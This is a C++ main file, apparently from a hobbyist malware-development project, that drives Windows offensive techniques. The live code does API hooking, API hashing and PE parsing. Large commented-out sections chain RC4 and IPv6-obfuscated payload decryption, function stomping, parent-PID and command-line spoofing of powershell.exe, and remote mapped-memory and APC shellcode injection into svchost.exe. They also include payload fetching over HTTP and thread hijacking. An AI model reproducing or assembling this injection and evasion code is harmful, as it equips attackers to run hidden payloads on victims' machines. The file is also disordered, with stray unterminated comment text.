#include "main.h"

int main()
{
	DWORD						  dwHookLength				= NULL,
								  dwPID0					= NULL,
								  dwPID1					= NULL,
							      dwPID2					= NULL,
								  dwOldProtections			= NULL,
								  dwThreadId				= NULL,
								  dwThreadId1				= NULL,
								  dwThreadId2				= NULL,
								  dwImageSize				= NULL,
								  dwHashedString1			= 0xFBB639B7,
								  dwHashedString2			= 0xB6E8EE02;

	SIZE_T						  sObfuscatedSize			= NULL,
								  sClearPayload				= NULL,
								  sBytesWritten				= 0x06,
								  sPaddedInputSize			= 0x40,
								  sOriginalInputSize		= 0x40;
	
	PBYTE						  pExPayload				= nullptr,
								  pStompingTarget			= nullptr,
								  pExtPayloadAddress		= nullptr,
								  pProcessBaseAddress		= nullptr,
								  pObfInput					= nullptr,
								 *pObfOutput				= nullptr,
								  pKey						= nullptr,
								  pImageData				= nullptr;

	PIMAGE_DOS_HEADER			  pImageDOSHeader_t			= nullptr;
	PIMAGE_NT_HEADERS			  pImageNtHeaders_t			= nullptr;
	PIMAGE_TLS_DIRECTORY		  pImageTlsDirectory_t		= nullptr;
	PIMAGE_FILE_HEADER			  pImageFileHeader_t		= nullptr;
	PIMAGE_SECTION_HEADER		  pImageSection_Entry		= nullptr;
	PIMAGE_SECTION_HEADER		  pImageSection_Entry_idata	= nullptr;
	PIMAGE_OPTIONAL_HEADER		  pImageOptionalHeaders_t	= nullptr;
	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir_t = nullptr;
	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRtFuncDirectory_t	= nullptr;
	PIMAGE_IMPORT_DESCRIPTOR	  pImageImportDirectory_t	= nullptr;
	PIMAGE_EXPORT_DIRECTORY		  pImageExportDirectory		= nullptr;

	HMODULE						  hModuleCustom				= nullptr;

	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
								  hProcess1					= INVALID_HANDLE_VALUE,
								  hProcess2					= INVALID_HANDLE_VALUE,
								  hThread					= INVALID_HANDLE_VALUE,
								  hThread1					= INVALID_HANDLE_VALUE,
								  hThread2					= INVALID_HANDLE_VALUE,
								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE,
								  hHeap						= INVALID_HANDLE_VALUE;


	LPWSTR						  pImagePath				= nullptr,
								  pImagePath2				= nullptr;

	CHAR						  pTargetStringToHash_1[]	= "NtAllocateVirtualMemory",
								  pTargetStringToHash_2[]	= "ntdll.dll",
								  pOutput[9]				= { };

	BYTE						  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00 },
								  pXorKey[8]				= { 0xB3, 0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };

	WCHAR						  TargetProcessName[]		= L"svchost.exe",
								  pTargetModuleName[]		= L"ntdll.dll",
								  pwPath[MAX_PATH]			= { };
	Context						  RC4Context_t				= { };
	RESOURCE					  resource					= { };
	PVOID						  fnLMBClick				= nullptr;
	PeFile						  PeFileClass				= { };

	hHeap = GetProcessHeap();

	if (hHeap == nullptr || hHeap == INVALID_HANDLE_VALUE) return -0x99;

	pImagePath = static_cast<LPWSTR>(HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR)));

	if (pImagePath == nullptr) return -0x98;

	FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess);

	pImagePath = FetchImagePathFromRemoteProcess(hProcess);

	PeFileClass.ParseDataFilePath(pImagePath);

	//pImageData = FetchImageData(pImagePath, hHeap, &dwImageSize);

	//if (pImageData == nullptr) return -97;

	hThread = GetCurrentThread();

	if (HookLocalThreadUsingDetours(reinterpret_cast<PVOID>(MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 1;

	MessageBoxA(nullptr, "[!] Malware Development Is Fun!\n", "API Hooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);

	if (UnHookLocalThreadUsingDetours(reinterpret_cast<PVOID>(MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 2;

	MessageBoxA(nullptr, "Malware Development Is Fun!\n", "API UnHooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);

	LogConsoleMouseClicks();

	pExPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, sBytesWritten, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY));

	HookWithVirtualAlloc(pExPayload, fnLMBClick, static_cast<DWORD>(sBytesWritten));

	if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId(), &dwThreadId, &hThread)) return -2;

	//printf("[!] Hashing Strings!\n");

	printf("0x%.8lx\n0x%.8lx\n", dwHashedString1, dwHashedString2);

	dwHashedString2 = GenerateCompileTimeHashW(pTargetModuleName);

	hModuleCustom = GetModuleHandleReplacementH(dwHashedString2);

	GetEnvironmentVariableW(L"WinDir", pwPath, MAX_PATH);

	//wprintf(L"\t[+] Hash Of \"%s\" is: 0x%lX\n",pTargetStringToHash, dwHashedString);

	GetProcessAddressReplacementH(hModuleCustom, dwHashedString1);
	
	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwHashedString2, &hProcess) == FALSE) printf(":(\n");

	pImagePath = FetchImagePathFromRemoteProcess(hProcess);

	printf("Starting PE Parser...\n");

	pImageData = FetchImageData(const_cast<LPWSTR>(L"C:\\WINDOWS\\System32\\kernel32.dll"), hHeap, &dwImageSize);

	if (pImageData == nullptr) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");

	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);

	FetchImageNtHeaders(pImageData, &pImageNtHeaders_t);

	FetchImageOptionalHeaders(pImageData, &pImageOptionalHeaders_t);

	FetchImageExportDirectory(pImageData, &pImageExportDirectory);

	FetchImageImportDirectory(pImageData, &pImageImportDirectory_t);

	FetchImageTlsDirectory(pImageData, &pImageTlsDirectory_t);

	FetchImageRtFuncDirectory(pImageData, &pImageRtFuncDirectory_t);

	FetchImageBaseRelocationDirectory(pImageData, &pImageBaseRelocationDir_t);

	FetchImageFileHeader(pImageData, &pImageFileHeader_t);

	PDWORD pRVAsOfNames = reinterpret_cast<PDWORD>(pImageData + pImageExportDirectory->AddressOfNames);



	/*
	FetchImageSection(pBaseOfData, &pImageSection_Entry);

	GetProcessAddressReplacement(GetModuleHandleW(L"NTDLL.dll"), const_cast<LPSTR>("NtQuerySystemInformation"));

	pImageSection_Entry_idata = FindImageSectionHeaderByName(".pdata", pImageSection_Entry, pImageFileHeader_t->NumberOfSections, pBaseOfData);

	printf("%s\n", reinterpret_cast<PCHAR>(pImageSection_Entry_idata->Name));

	if (!FetchStompingTarget(const_cast<LPSTR>(SACRIFICIAL_DLL), const_cast<LPSTR>(SACRIFICIAL_FUNC), reinterpret_cast<PVOID * >(&pStompingTarget))) return -10;

	if (!ReadRegKeys(&pObfOutput, reinterpret_cast<PDWORD>(&sObfuscatedSize))) return -1;

	if ((pKey = static_cast<PUCHAR>(LocalAlloc(LPTR, 256))) == nullptr) return -2;

	if (!DeobfuscatePayloadIPv6(&pKey,pObfOutput, sObfuscatedSize + 1, &sClearPayload, static_cast<BYTE>(sPaddedInputSize - sOriginalInputSize))) return -3;

	strcat_s(reinterpret_cast<PCHAR>(pKey), 256, "\n");

	if (!FetchResource(&resource)) return -5;

	if ((pObfInput = static_cast<PUCHAR>(LocalAlloc(LPTR, resource.sSize))) == nullptr) return -14;

	if (rInit(&RC4Context_t, pKey, strlen(reinterpret_cast<PCHAR>(pKey))) == FALSE) return -6;

	rFin(&RC4Context_t, static_cast<PUCHAR>(resource.pAddress), pObfInput, resource.sSize);

	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
	
	for (UCHAR i = 0; i < 8; i++)
	{
		pOutput[i] = static_cast<CHAR>(pTargetSubDirectory[i] ^ pXorKey[i]);
	}

	SpoofProcessCLA_PPID(const_cast<LPWSTR>(SPOOFED_COMMAND_LINE), hProcess, const_cast<LPWSTR>(MALICIOUS_COMMAND_LINE), sizeof(L"powershell.exe"), pOutput,&hProcess1, &dwPID1, &hThread, &dwThreadId);

	//SpoofParentProcessId(pTargetProcessName, hProcess, &dwPID1, &hProcess1, &dwThreadId, &hThread);

	hProcess1 = OpenProcess(PROCESS_VM_OPERATION, FALSE, dwPID1);

	ResumeThread(hThread);

	InjectPayloadRemoteMappedMemory(pObfInput, &pExtPayloadAddress, &pExPayload, resource.sSize, &hPayloadObjectHandle, hProcess1);

	hThread2 = OpenThread(THREAD_SET_CONTEXT, FALSE, dwThreadId);

	Sleep(10);

	if (!QueueUserAPC(reinterpret_cast<PAPCFUNC>(pExtPayloadAddress), hThread, 0)) 
	{

		printf("[!] Queue User APC Failed With Error : %lx \n", GetLastError());

		return -1;
	}

	WaitForSingleObjectEx(hThread, 150, TRUE);

	ResumeThread(hThread);

	WaitForSingleObjectEx(hThread, INFINITE, TRUE);

	Sleep(100);

	//WaitForSingleObjectEx(hThread1, INFINITE, TRUE);

	//WaitForSingleObjectEx(hProcess1, INFINITE, TRUE);

	//SpoofCommandLineArguments(SPOOFED_COMMAND_LINE, MALICIOUS_COMMAND_LINE, sizeof(L"powershell.exe"), &hProcess2, &dwPID2, &hPayloadObjectHandle, &dwThreadId);

	//hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);

	CloseHandle(hProcess1);

	//if(!hThread1) WaitForSingleObject(hThread1, INFINITE);

	printf("Parent Process PID %lu Child Process PID %lu\n", dwPID0, dwPID1);
	
	//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);

	//if (!(pExPayload = VirtualAllocEx(hProcess1, 0, pPayload_t.sText,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return -7;

	//if (!WriteProcessMemory(hProcess1, pExPayload, pPayload_t.pText, pPayload_t.sText, &sBytesWritten)) return -10;

	//VirtualProtectEx(hProcess1, pExPayload, pPayload_t.sText,PAGE_EXECUTE, &dwOldProtections);

	//QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread, 0);
	
	InjectCallbackPayloadEnumDesktops(pObfInput, static_cast<DWORD>(resource.sSize), &dwOldProtections, reinterpret_cast<PVOID * >(&pExtPayloadAddress));

	//WaitForSingleObject(hThread, 150);

	//if (!UnmapViewOfFile(pObfInput)) printf("[x] Remote memory Unmapping Failed With Error 0x%lx", GetLastError());
	
	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddress);

	getchar();

	//DebugActiveProcessStop(dwPID1);

	//ResumeThread(hThread);

	//CloseHandle(hThread);

	//CloseHandle(hProcess);

	wprintf(L"[!] Finished!\n");

	//char pPath[MAX_PATH] = { '\0' };

	printf("[#] Press 'Enter' To Exit! :)");
	*/
	return 0;
}

/*
for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++)
{
	PDWORD pFuncNameArray = reinterpret_cast<PDWORD>(pBaseOfData + pImageExportDirectory->AddressOfNames);

	PCHAR pFuncName = reinterpret_cast<PCHAR>(pBaseOfData + pFuncNameArray[i]);

	printf("%s\n", pFuncName);
}
*/

//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);

//MapLocalMemory(pObfInput, &pExPayload, resource.sSize, &hPayloadObjectHandle);

/*if (!FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess))
{
	wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
	return -1;
}
*/

//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) return -2;

//wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);

//InjectPayloadRemoteMappedMemory(pStompingTarget, &pExtPayloadAddres, &pObfInput, resource.sSize, &hPayloadObjectHandle, hProcess);

//InjectPayloadQueueUserAPC(hThread, pObfInput, resource.sSize);
//InjectRemoteDll(pObfInput, hProcess, SACRIFICIAL_DLL, SACRIFICIAL_FUNC, resource.sSize, &pStompingTarget);

/*Payload Execution Control Code
if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")))
{
	printf("[i] Created A Semaphore Successfully!\n");
}
HANDLE
	hEvent = CreateEventA(NULL, FALSE, FALSE, "Control String1"),
	hMutex = CreateMutexA(NULL, FALSE, "Control String2");
printf("[i] Created A Event Successfully!\n");
printf("[i] Created A Mutex Successfully!\n");

if (!FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget)) return -12;
if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;

for (int i = 0; i < 10; i++) {

	if ((hEvent = CreateEventA(NULL, FALSE, FALSE, "Control String1")) != NULL && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create An Event Will Not Execute, as a Semaphore already Exists!!!\n");
	else
	{
		printf("[i] Created Another Event!");
		if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;

	}
	if ((hPayloadObjectHandle = CreateSemaphoreA(NULL, 15, 15, "Control String")) && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create a Event, as a Event already Exists!!!\n");
	else
	{
		printf("[i] Created Semaphore!");
		if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;

	}
	if ((hMutex = CreateMutexA(NULL, FALSE, "Control String2")) != NULL && GetLastError() == ERROR_ALREADY_EXISTS) printf("[!] Can't Create a Mutex, as a Mutex already Exists!!!\n");
	else
	{
		printf("[i] Created Another Mutex!");
		if (!StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize))return -13;

	}

}
*/

//if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hPayloadObjectHandle))return -7;

//InjectPayloadRemoteMappedMemory(pExtPayloadAddres, &pExtPayloadAddres, resource.sSize, &hPayloadObjectHandle, hProcess);

//SetupScanFileQueueA(NULL, NULL, NULL, NULL, NULL, NULL);

//printf("0x%p\n", pStompingTarget);

//UnmapViewOfFile(pObfInput);

//HijackThread(hThread, pStompingTarget);

	//if (!InjectPayloadQueueUserAPC(hThread1, pExPayload, pPayload_t.sText)) return -6;

	//if (!InjectRemoteProcessShellcode(hProcess, pPayload_t.pText, pPayload_t.sText, &pExPayload))printf("[!] Failed To Inject Shellcode!\n");



	//printf("[i] Found a Thread! Thread Id: %lu\n[!] Starting A Test Run...\n", dwThreadId);


	/*
	if (!FetchLocalThreadHandle(
		GetCurrentThreadId(),
		&dwPID2,
		&hThread1)
		)return -4;
	*/
	//CreateSacrificialThread(&dwThreadId, &hThread1);

	//printf("[#] Payload Created Successfully! :)\n");

	//HijackThread(hThread, pExPayload);

	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) wprintf(L"[!] Failed to fetch a remote thread handle and id wis Error Code: %lx\n", GetLastError());

	//HijackLocalThread(hThread1, pPayload_t.pText, pPayload_t.sText);

	/*if (!CreateSuspendedProcess(
		"Notepad.exe",
		&dwPID0,
		&hProcess,
		&hThread
	)) return -7;
	
	if (!InjectRemoteProcessShellcode(
		hProcess, 
		pPayload_t.pText, 
		pPayload_t.sText, 
		(PVOID *)&pExtPayloadAddres
	)) return -8;

	if (!HijackThread(
		hThread1, 
		pExtPayloadAddres
	))return -9;
	*/
	/*

	HijackLocalThread(hThread, pPayload_t.pText, pPayload_t.sText);

	if (!ResumeThread(hThread)) return  -4;

	WaitForSingleObject(hThread, INFINITE);

	if (!(pExPayload = VirtualAllocEx(hProcess, 0, pPayload_t.sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))return -8;

	if (!WriteProcessMemory(hProcess, pExPayload, pPayload_t.pText, pPayload_t.sText, &sBytesWritten)) printf("[x] WriteProcessMemory Failed!\n");

	printf("Retrieved Payload: %s\n", (char*)pPayload_t.pText);

	RtlSecureZeroMemory(pPayload_t.pText, resource.sSize + 1);

	if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, PAGE_EXECUTE, &dwOldProtections)) return -5;

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pExPayload, NULL, 0, 0))) return -6;
	*/
	
	//RtlSecureZeroMemory(pKey, strlen((char *)pKey));

	//if (!(dwPID0 = GetCurrentProcessId())) return -3;

	//if ((hProcess =OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID0)) == INVALID_HANDLE_VALUE) return -2;

	//if (!FetchProcessHandleEnumProcesses(L"Notepad.exe", &dwPID0, &hProcess)) printf("[!] Enumerate Remote Processes Handles Failed To Find Chrome\n");

	//hProcess2 = FetchProcessHandleHelpTool32(L"Notepad.exe", &pid2);

	//if (!(hThread= CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&FetchDrives,  NULL, CREATE_SUSPENDED, &dwThreadId))) return FALSE;

	//CheckVM();

 	//if (system("pause"))printf("f\n");

	//LPWSTR ProcessName = LocalAlloc(LPTR, 128);

	//memcpy(ProcessName,(L"Notepad.exe"), sizeof(WCHAR) * wcslen(L"Notepad.exe\0"));

	//printf("[i] Reached End Of Searching.\n");
	
	//*Initiate Payload Obfuscation

	//if (!(pObfInput = LocalAlloc(LPTR, 129))) return -1;

	//memset(pObfInput, '\0', 129);

	// strlen((char *)pObfInput),
	
	//size_t sPaddedInputSize = 64, ;

	//pClearPayload = LocalAlloc(LPTR, sClearPayload + 1);
	/*
	 * MACFuscation
	 *
	size_t sOriginalInputSize = strlen((char *)pObfInput), sPaddedInputSize = 0, sObfuscatedSize = 0, sClearPayload = 0;
	
	printf("[i] MAC Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	ObfuscatePayloadMAC(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	printf("[i] MAC  Obfuscated Output:\n");

	for (int i = 0; i < (int)(sPaddedInputSize / MAC); i++) printf("\t[%d] -  %s | Output Length:%zu\n", i, (char*)pObfOutput[i], strlen((char*)pObfOutput[i]));

	//RtlMacToStrA((char **)pObfOutput, (int)(sPaddedInputSize / MAC), (unsigned char)(sPaddedInputSize - sOriginalInputSize),&pClearPayload, &sClearPayload);

	DeobfuscatePayloadMAC(&pClearPayload, pObfOutput, sObfuscatedSize, &sClearPayload, (Uchar)(sPaddedInputSize - sOriginalInputSize));

	printf("\n[i] MAC Deobfuscated Output: %s\n[i] MAC Deobfuscated Output's Length:%zu\n", (char *)pClearPayload, strlen((char*)pClearPayload));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");
	*/
	/*IPv4Fuscation

	printf("[i] IPv4 Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	ObfuscatePayloadIPv4(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	printf("[i] IPv4 Obfuscated Output:\n");

	for (int i = 0; i < (int)(sPaddedInputSize/IPv4); i++) printf("\t[%d] -  %s | Output Length:%zu\n", i, (char *)pObfOutput[i], strlen((char*)pObfOutput[i]));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	//RtlIpv4toStrA(pObfOutput, (int)(sPaddedInputSize / IPv4), (unsigned char)(sPaddedInputSize - sOriginalInputSize), &pClearPayload, &sClearPayload);

	DeobfuscatePayloadIPv4(&pClearPayload, pObfOutput, sObfuscatedSize, &sClearPayload, (unsigned char)(sPaddedInputSize - sOriginalInputSize));

	printf("\n[i] IPv4 Deobfuscated Output: %s\n[i] IPv4 Deobfuscated Output's Length:%zu\n", (char *)pClearPayload, strlen((char*)pClearPayload));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");
	*/
	//Ipv6Fuscation
	//printf("[i] IPv6 Input: %s\n[i] IPv6 Input's Length: %zu\n", (*pObfInput), sOriginalInputSize);
	//size_t NumberOfElements = sObfuscatedSize / (IPv6Arr - 1);
	//for (int i = 0; i < 48; i++) printf("--");

	//printf("\n");

	//ObfuscatePayloadIPv6(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	//printf("[i] IPv6 Obfuscated Output:\n");

	//for (size_t i = 0; i < NumberOfElements; i++) { printf("\t[%d] -  %s | Output Length:%zu\n", i, (char*)pObfOutput[i], strlen((char*)pObfOutput[i])); }

	//RtlIpv6ToStrA((char**)pObfOutput, (int)(sPaddedInputSize / IPv6), (unsigned char)(sPaddedInputSize - sOriginalInputSize), &pClearPayload, &sClearPayload);
	
	//for (size_t i = 0; i < strlen(testcase); i++) {if ((UCHAR)testcase[i] != pKeysetup[i]) { printf(" [! %zu]", i); return -4;}}

	//strcat_s(pKey, 256, "\n");


	//CloseHandle(hProcess);

/*

	SIZE_T sPayload = 0;

	PBYTE pPayload;

	if (!FetchPayloadHttpDynamic(L"http://127.0.0.1:8000/Resources/Test1.jpg", &pPayload, &sPayload)) printf("[x] Failed :(\n");

	else printf("[!] Success\n");

	DWORD dwProcessId;

	lpPAYLOAD pText_t;

	HANDLE hProcess;

	RESOURCE resource;

	if (!FetchResource(&resource)) return -1;

	if (!FetchProcessHandleEnumProcesses(L"svchost.exe", &dwProcessId, &hProcess)) return -2;

	//if ((hProcess = FetchProcessHandleHelpTool32(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }

	//if (!InjectRemoteDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;


	//WritePayloadToRegistry(resource.pAddress, (DWORD) resource.sSize);

	//call();

	//Test();

	if (!(pText_t = Test())) return -5;

	if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;

	unsigned char *pK[256] = {'\0'};

	printf("[!] Enter Your Key Please:\n");

	fgets(pK, 255, stdin);

	unsigned char *pDecryptedPayload = malloc(pText_t->sText);

	Context context_t;
	*/

	//if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, dwOldProtections, &dwOldProtections)) return - 7;

	//BOOL State = WriteProcessMemory(hProcess, pExPayload, "\0", pPayload_t.sText, &sBytesWritten);
	//printf("%d" ,State);

	//printf("\n[i] IPv6 Deobfuscated Output: %s\n[i] IPv6 Deobfuscated Output's Length:%zu\n", (char *)pKey, strlen((char*)pKey));

	//for (int i = 0; i < 48; i++) printf("--");

	//printf("\n");
	/*/



	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);

	//DWORD dwOldRights;

	//if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;

	//DWORD dwThreadPid;

	//HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);

	WCHAR pPath[MAX_PATH] = { L'\0' };

	FetchDrives(pPath);

	if (!pPath[0]) {printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError()); return -1;}

	PrintDrives(pPath);

	while (!UserInputDrives(pPath)) { printf("[X] Wrong Input!\n"); PrintDrives(pPath);}

	PrintCWD(pPath);

	WIN32_FIND_DATA_ARRAYW *pFiles_arr_t = FetchFileArrayW(pPath);

	if (pFiles_arr_t == NULL)
	{
		printf("[X] Fetching Folders Failed\nError Code:0x%.8x\n", GetLastError());
		return -2;
	}

	PrintFilesArrayW(pFiles_arr_t);

	UserInputFolders(pPath, pFiles_arr_t);

	while (!UserInputContinueFolders()) {

		if (pFiles_arr_t == NULL) {
			printf("[!] No Files Under Current Folder.\n");
			break;
		}
		FreeFileArray(pFiles_arr_t);

		pFiles_arr_t = FetchFileArrayW(pPath);

		PrintCWD(pPath);

		PrintFilesArrayW(pFiles_arr_t);

		UserInputFolders(pPath, pFiles_arr_t);
	}

	PrintCWD(pPath);
	wprintf(L"File Name: %s", pFiles_arr_t->pFilesArr[0].pFileName);


	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
	HANDLE hFile = INVALID_HANDLE_VALUE;

   GENERIC_READ = 0x80000000
   GENERIC_WRITE = 0x40000000. (0d1073741824).
  GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
 */
